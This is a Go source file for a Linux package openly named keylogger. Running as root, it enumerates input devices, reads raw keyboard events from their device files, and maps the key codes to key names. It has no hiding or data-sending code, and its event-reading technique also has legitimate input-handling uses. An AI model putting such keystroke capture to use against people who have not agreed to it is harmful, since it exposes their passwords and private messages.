// keylogger
package keylogger

import (
	"bufio"
	"bytes"
	"encoding/binary"
	"fmt"
	"io/ioutil"
	"os"
	"os/user"
	"strings"
	"time"
)

func NewDevices() ([]*InputDevice, error) {
	var ret []*InputDevice

	if err := checkRoot(); err != nil {
		return ret, err
	}

	for i := 0; i < MAX_FILES; i++ {
		buff, err := ioutil.ReadFile(fmt.Sprintf(INPUTS, i))
		if err != nil {
			break
		}
		ret = append(ret, newInputDeviceReader(buff, i))
	}

	return ret, nil
}

func checkRoot() error {
	u, err := user.Current()
	if err != nil {
		return err
	}
	if u.Uid != "0" {
		return fmt.Errorf("Cannot read device files. Are you running as root?")
	}
	return nil
}

func newInputDeviceReader(buff []byte, id int) *InputDevice {
	rd := bufio.NewReader(bytes.NewReader(buff))
	rd.ReadLine()
	dev, _, _ := rd.ReadLine()
	splt := strings.Split(string(dev), "=")
	//delete " from end and beginning
	name := splt[1]
	if name[0] == '"' {
		name = name[1:]
	}
	if name[len(name)-1] == '"' {
		name = name[:len(name)-1]
	}
	return &InputDevice{
		Id:   id,
		Name: name,
	}
}

func NewKeyLogger(dev *InputDevice) *KeyLogger {
	return &KeyLogger{
		Dev:      dev,
		stopChan: make(chan struct{}),
	}
}

//Stop stops a current
func (t *KeyLogger) Stop() {
	select {
	case <-t.stopChan:
		return //already closed
	default:
		close(t.stopChan)
	}
}

func (t *KeyLogger) Read() (chan InputEvent, error) {
	ret := make(chan InputEvent, 512)

	if err := checkRoot(); err != nil {
		close(ret)
		return ret, err
	}

	fd, err := os.Open(fmt.Sprintf(DEVICE_FILE, t.Dev.Id))
	if err != nil {
		close(ret)
		return ret, fmt.Errorf("Error opening device file: %v", err)
	}

	go func() {

		tmp := make([]byte, eventsize)
		event := InputEvent{}
	Loop:
		for {
			select {
			case <-t.stopChan:
				close(ret)
				break Loop
			default:
			}
			fd.SetDeadline(time.Now().Add(1 * time.Second))
			n, err := fd.Read(tmp)
			if err != nil {
				continue
			}
			if n <= 0 {
				continue
			}

			if err := binary.Read(bytes.NewBuffer(tmp), binary.LittleEndian, &event); err != nil {
				//panic(err)
				continue
			}

			ret <- event

		}
	}()
	return ret, nil
}

func (t *InputEvent) KeyString() string {
	return keyCodeMap[t.Code]
}
